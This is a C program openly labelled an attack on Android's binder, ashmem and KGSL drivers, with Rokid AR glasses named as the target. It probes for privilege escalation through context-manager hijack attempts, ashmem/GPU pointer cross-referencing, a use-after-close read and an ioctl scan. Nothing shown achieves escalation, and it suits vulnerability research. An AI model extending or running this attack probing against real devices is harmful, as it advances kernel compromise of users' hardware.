/*
 * Android Binder/Ashmem Combined Attack
 * ======================================
 *
 * Both /dev/binder and /dev/ashmem are world-writable (mode=666).
 * Combine with KGSL for privilege escalation.
 *
 * Attack vectors:
 * 1. Binder transaction manipulation
 * 2. Ashmem UAF via racing
 * 3. KGSL + Ashmem cross-reference
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o binder_ashmem_attack binder_ashmem_attack.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <linux/ashmem.h>

// ============================================================================
// Binder Definitions
// ============================================================================

#define BINDER_VERSION _IOWR('b', 9, uint32_t)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_SET_IDLE_TIMEOUT _IOW('b', 3, int64_t)
#define BINDER_SET_CONTEXT_MGR _IOW('b', 7, int32_t)
#define BINDER_THREAD_EXIT _IOW('b', 8, int32_t)
#define BINDER_GET_NODE_INFO_FOR_REF _IOWR('b', 12, struct binder_node_info_for_ref)
#define BINDER_FREEZE _IOW('b', 14, struct binder_freeze_info)
#define BINDER_GET_FROZEN_INFO _IOWR('b', 15, struct binder_frozen_status_info)
#define BINDER_ENABLE_ONEWAY_SPAM_DETECTION _IOW('b', 16, uint32_t)
#define BINDER_GET_EXTENDED_ERROR _IOWR('b', 17, struct binder_extended_error)

// Binder transaction types
#define BC_TRANSACTION _IOW('c', 0, struct binder_transaction_data)
#define BC_REPLY _IOW('c', 1, struct binder_transaction_data)
#define BC_ACQUIRE_RESULT _IOW('c', 2, int32_t)
#define BC_FREE_BUFFER _IOW('c', 3, binder_uintptr_t)
#define BC_INCREFS _IOW('c', 4, uint32_t)
#define BC_ACQUIRE _IOW('c', 5, uint32_t)
#define BC_RELEASE _IOW('c', 6, uint32_t)
#define BC_DECREFS _IOW('c', 7, uint32_t)
#define BC_ENTER_LOOPER _IO('c', 12)
#define BC_EXIT_LOOPER _IO('c', 13)
#define BC_REQUEST_DEATH_NOTIFICATION _IOW('c', 14, struct binder_handle_cookie)
#define BC_DEAD_BINDER_DONE _IOW('c', 16, binder_uintptr_t)

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;

struct binder_node_info_for_ref
{
    uint32_t handle;
    uint32_t strong_count;
    uint32_t weak_count;
    uint32_t reserved1;
    uint32_t reserved2;
    uint32_t reserved3;
};

struct binder_freeze_info
{
    uint32_t pid;
    uint32_t enable;
    uint32_t timeout_ms;
};

struct binder_frozen_status_info
{
    uint32_t pid;
    uint32_t sync_recv;
    uint32_t async_recv;
};

struct binder_extended_error
{
    uint32_t id;
    uint32_t command;
    int32_t param;
};

struct binder_write_read
{
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};

#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)

struct binder_transaction_data
{
    union
    {
        uint32_t handle;
        binder_uintptr_t ptr;
    } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union
    {
        struct
        {
            binder_uintptr_t buffer;
            binder_uintptr_t offsets;
        } ptr;
        uint8_t buf[8];
    } data;
};

struct binder_handle_cookie
{
    uint32_t handle;
    binder_uintptr_t cookie;
};

// ============================================================================
// KGSL Definitions
// ============================================================================

#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092f

struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

// ============================================================================
// Globals
// ============================================================================

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

int kgsl_fd = -1;
int binder_fd = -1;
void *binder_map = NULL;
size_t binder_map_size = 0x200000; // 2MB default

// ============================================================================
// Helpers
// ============================================================================

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

void hexdump(const char *desc, const void *data, size_t size)
{
    const uint8_t *p = (const uint8_t *)data;
    printf("%s:\n", desc);
    for (size_t i = 0; i < size && i < 128; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

// ============================================================================
// Test 1: Binder Version and Basic IOCTL
// ============================================================================

void test_binder_basic(void)
{
    printf("\n=== Test 1: Binder Basic Operations ===\n");

    int version = 0;
    int ret = ioctl(binder_fd, BINDER_VERSION, &version);
    printf("[*] BINDER_VERSION: ret=%d version=%d\n", ret, version);

    // Map binder
    binder_map = mmap(NULL, binder_map_size, PROT_READ,
                      MAP_PRIVATE, binder_fd, 0);
    if (binder_map == MAP_FAILED)
    {
        printf("[-] Binder mmap failed\n");
        binder_map = NULL;
    }
    else
    {
        printf("[+] Binder mapped at %p\n", binder_map);
    }

    // Set max threads
    uint32_t max_threads = 16;
    ret = ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    printf("[*] BINDER_SET_MAX_THREADS: ret=%d\n", ret);
}

// ============================================================================
// Test 2: Binder Write-Read Operations
// ============================================================================

void test_binder_write_read(void)
{
    printf("\n=== Test 2: Binder Write-Read ===\n");

    if (!binder_map)
    {
        printf("[-] Binder not mapped\n");
        return;
    }

    // Try to enter looper
    uint8_t write_buf[256] = {0};
    uint8_t read_buf[256] = {0};

    // BC_ENTER_LOOPER command
    uint32_t *cmd = (uint32_t *)write_buf;
    cmd[0] = BC_ENTER_LOOPER;

    struct binder_write_read bwr = {0};
    bwr.write_size = 4;
    bwr.write_buffer = (binder_uintptr_t)write_buf;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    printf("[*] BINDER_WRITE_READ (BC_ENTER_LOOPER): ret=%d errno=%d\n", ret, errno);
    printf("[*] write_consumed=%lu read_consumed=%lu\n",
           bwr.write_consumed, bwr.read_consumed);

    if (bwr.read_consumed > 0)
    {
        hexdump("Read data", read_buf, bwr.read_consumed);
    }
}

// ============================================================================
// Test 3: Try to become context manager
// ============================================================================

void test_binder_context_mgr(void)
{
    printf("\n=== Test 3: Binder Context Manager ===\n");

    // Try to become context manager (usually fails for non-system processes)
    int32_t zero = 0;
    int ret = ioctl(binder_fd, BINDER_SET_CONTEXT_MGR, &zero);
    printf("[*] BINDER_SET_CONTEXT_MGR: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret == 0)
    {
        printf("[!!!] Successfully became context manager!\n");
    }
}

// ============================================================================
// Test 4: Ashmem Operations
// ============================================================================

void test_ashmem_operations(void)
{
    printf("\n=== Test 4: Ashmem Operations ===\n");

    int ashmem_fd = open("/dev/ashmem", O_RDWR);
    if (ashmem_fd < 0)
    {
        printf("[-] Cannot open ashmem\n");
        return;
    }
    printf("[+] ashmem_fd = %d\n", ashmem_fd);

    // Get name
    char name[256] = {0};
    if (ioctl(ashmem_fd, ASHMEM_GET_NAME, name) >= 0)
    {
        printf("[*] Current name: '%s'\n", name);
    }

    // Set name
    strcpy(name, "exploit_test");
    int ret = ioctl(ashmem_fd, ASHMEM_SET_NAME, name);
    printf("[*] ASHMEM_SET_NAME: ret=%d\n", ret);

    // Set size
    ret = ioctl(ashmem_fd, ASHMEM_SET_SIZE, 0x100000);
    printf("[*] ASHMEM_SET_SIZE: ret=%d\n", ret);

    // Get size
    int size = ioctl(ashmem_fd, ASHMEM_GET_SIZE, NULL);
    printf("[*] ASHMEM_GET_SIZE: %d (0x%x)\n", size, size);

    // Map it
    void *ashmem_map = mmap(NULL, size, PROT_READ | PROT_WRITE,
                            MAP_SHARED, ashmem_fd, 0);
    if (ashmem_map == MAP_FAILED)
    {
        printf("[-] mmap failed\n");
        close(ashmem_fd);
        return;
    }
    printf("[+] Mapped at %p\n", ashmem_map);

    // Write pattern
    memset(ashmem_map, 0x42, size);
    printf("[+] Wrote pattern\n");

    // Pin/Unpin operations
    struct ashmem_pin
    {
        uint32_t offset;
        uint32_t len;
    } pin = {0, (uint32_t)size};

    ret = ioctl(ashmem_fd, ASHMEM_PIN, &pin);
    printf("[*] ASHMEM_PIN: ret=%d\n", ret);

    ret = ioctl(ashmem_fd, ASHMEM_UNPIN, &pin);
    printf("[*] ASHMEM_UNPIN: ret=%d\n", ret);

    // Try to purge (requires root usually)
    ret = ioctl(ashmem_fd, ASHMEM_PURGE_ALL_CACHES, NULL);
    printf("[*] ASHMEM_PURGE_ALL_CACHES: ret=%d errno=%d\n", ret, errno);

    munmap(ashmem_map, size);
    close(ashmem_fd);
}

// ============================================================================
// Test 5: Ashmem + KGSL Cross-Reference
// ============================================================================

void test_ashmem_kgsl(void)
{
    printf("\n=== Test 5: Ashmem + KGSL Cross-Reference ===\n");

    // Create ashmem
    int ashmem_fd = open("/dev/ashmem", O_RDWR);
    if (ashmem_fd < 0)
    {
        printf("[-] Cannot open ashmem\n");
        return;
    }

    ioctl(ashmem_fd, ASHMEM_SET_SIZE, 0x10000);
    void *ashmem_map = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                            MAP_SHARED, ashmem_fd, 0);
    if (ashmem_map == MAP_FAILED)
    {
        close(ashmem_fd);
        return;
    }
    printf("[+] Ashmem at %p\n", ashmem_map);

    // Write magic value
    *(uint64_t *)ashmem_map = 0x4141414141414141ULL;

    // Allocate KGSL buffer
    struct gpumem_alloc_req alloc = {0};
    alloc.size = 0x10000;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        printf("[-] GPU alloc failed\n");
        munmap(ashmem_map, 0x10000);
        close(ashmem_fd);
        return;
    }
    printf("[+] GPU at 0x%lx\n", alloc.gpuaddr);

    // Map GPU
    uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t offset = (page_idx + 1) * 0x1000;
    void *gpu_map = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, kgsl_fd, offset);
    if (gpu_map == MAP_FAILED)
    {
        printf("[-] GPU mmap failed\n");
        munmap(ashmem_map, 0x10000);
        close(ashmem_fd);
        return;
    }
    printf("[+] GPU mapped at %p\n", gpu_map);

    // Write GPU pointer to ashmem
    *(uint64_t *)ashmem_map = (uint64_t)gpu_map;
    printf("[*] Stored GPU map ptr in ashmem: %p\n", gpu_map);

    // Write ashmem pointer to GPU
    *(uint64_t *)gpu_map = (uint64_t)ashmem_map;
    printf("[*] Stored ashmem ptr in GPU: %p\n", ashmem_map);

    // Check for any interesting behaviors
    printf("[*] GPU value: 0x%lx\n", *(uint64_t *)gpu_map);
    printf("[*] Ashmem value: 0x%lx\n", *(uint64_t *)ashmem_map);

    // Try to trigger cross-reference issues
    munmap(ashmem_map, 0x10000);
    close(ashmem_fd);

    // GPU buffer still has the ashmem pointer
    uint64_t old_ptr = *(uint64_t *)gpu_map;
    printf("[*] GPU still has: 0x%lx (ashmem is now unmapped)\n", old_ptr);

    munmap(gpu_map, 0x10000);
}

// ============================================================================
// Test 6: Binder UAF Attempt
// ============================================================================

void test_binder_uaf(void)
{
    printf("\n=== Test 6: Binder Multi-FD Race ===\n");

    int fd1 = open("/dev/binder", O_RDWR);
    int fd2 = open("/dev/binder", O_RDWR);
    int fd3 = open("/dev/binder", O_RDWR);

    if (fd1 < 0 || fd2 < 0 || fd3 < 0)
    {
        printf("[-] Cannot open multiple binder fds\n");
        return;
    }
    printf("[+] Opened binder: fd1=%d fd2=%d fd3=%d\n", fd1, fd2, fd3);

    // Map all
    void *map1 = mmap(NULL, 0x100000, PROT_READ, MAP_PRIVATE, fd1, 0);
    void *map2 = mmap(NULL, 0x100000, PROT_READ, MAP_PRIVATE, fd2, 0);
    void *map3 = mmap(NULL, 0x100000, PROT_READ, MAP_PRIVATE, fd3, 0);

    printf("[*] Maps: %p %p %p\n", map1, map2, map3);

    // Close fd1 but keep its mapping
    close(fd1);
    printf("[+] Closed fd1, map1 still at %p\n", map1);
    fflush(stdout);

    // Try to read from closed fd's mapping
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        uint64_t val = *(volatile uint64_t *)map1;
        printf("[*] map1 value after fd close: 0x%lx\n", val);
        fflush(stdout);
    }
    else
    {
        printf("[*] Caught signal %d reading map1 (expected)\n", sig_received);
        fflush(stdout);
    }

    // Cleanup
    if (map1 != MAP_FAILED)
        munmap(map1, 0x100000);
    if (map2 != MAP_FAILED)
        munmap(map2, 0x100000);
    if (map3 != MAP_FAILED)
        munmap(map3, 0x100000);
    close(fd2);
    close(fd3);
}

// ============================================================================
// Test 7: Scan for vulnerable IOCTL codes
// ============================================================================

void test_binder_ioctl_scan(void)
{
    printf("\n=== Test 7: Binder IOCTL Scan ===\n");

    uint8_t buf[256] = {0};

    // Try various binder IOCTL commands
    struct
    {
        uint32_t cmd;
        const char *name;
    } cmds[] = {
        {_IOC(_IOC_READ | _IOC_WRITE, 'b', 1, 48), "BINDER_WRITE_READ"},
        {_IOC(_IOC_WRITE, 'b', 3, 8), "BINDER_SET_IDLE_TIMEOUT"},
        {_IOC(_IOC_WRITE, 'b', 5, 4), "BINDER_SET_MAX_THREADS"},
        {_IOC(_IOC_WRITE, 'b', 6, 4), "BINDER_SET_IDLE_PRIORITY"},
        {_IOC(_IOC_WRITE, 'b', 7, 4), "BINDER_SET_CONTEXT_MGR"},
        {_IOC(_IOC_WRITE, 'b', 8, 4), "BINDER_THREAD_EXIT"},
        {_IOC(_IOC_READ | _IOC_WRITE, 'b', 9, 4), "BINDER_VERSION"},
        {_IOC(_IOC_READ | _IOC_WRITE, 'b', 12, 24), "BINDER_GET_NODE_INFO_FOR_REF"},
        {_IOC(_IOC_WRITE, 'b', 13, 4), "BINDER_SET_CONTEXT_MGR_EXT"},
        {_IOC(_IOC_WRITE, 'b', 14, 12), "BINDER_FREEZE"},
        {_IOC(_IOC_READ | _IOC_WRITE, 'b', 15, 12), "BINDER_GET_FROZEN_INFO"},
        {_IOC(_IOC_WRITE, 'b', 16, 4), "BINDER_ENABLE_ONEWAY_SPAM"},
        {_IOC(_IOC_READ | _IOC_WRITE, 'b', 17, 12), "BINDER_GET_EXTENDED_ERROR"},
    };

    for (size_t i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++)
    {
        memset(buf, 0, sizeof(buf));
        errno = 0;
        int ret = ioctl(binder_fd, cmds[i].cmd, buf);

        if (ret == 0 || errno != ENOTTY)
        {
            printf("[+] 0x%08x %-30s ret=%d errno=%d\n",
                   cmds[i].cmd, cmds[i].name, ret, errno);
        }
    }
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    // Disable buffering so printf outputs immediately (avoid losing logs on crash)
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  Binder/Ashmem Combined Attack                                ║\n");
    printf("║  Target: Rokid AR Glasses                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // Open devices
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open kgsl: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] kgsl_fd = %d\n", kgsl_fd);
    }

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0)
    {
        printf("[-] Cannot open binder: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] binder_fd = %d\n", binder_fd);
    }

    // Run tests
    if (binder_fd >= 0)
    {
        test_binder_basic();
        test_binder_write_read();
        test_binder_context_mgr();
        test_binder_uaf();
        test_binder_ioctl_scan();
    }

    test_ashmem_operations();

    if (kgsl_fd >= 0)
    {
        test_ashmem_kgsl();
    }

    // Cleanup
    if (binder_map)
        munmap(binder_map, binder_map_size);
    if (binder_fd >= 0)
        close(binder_fd);
    if (kgsl_fd >= 0)
        close(kgsl_fd);

    printf("\n=== Tests Complete ===\n");
    return 0;
}
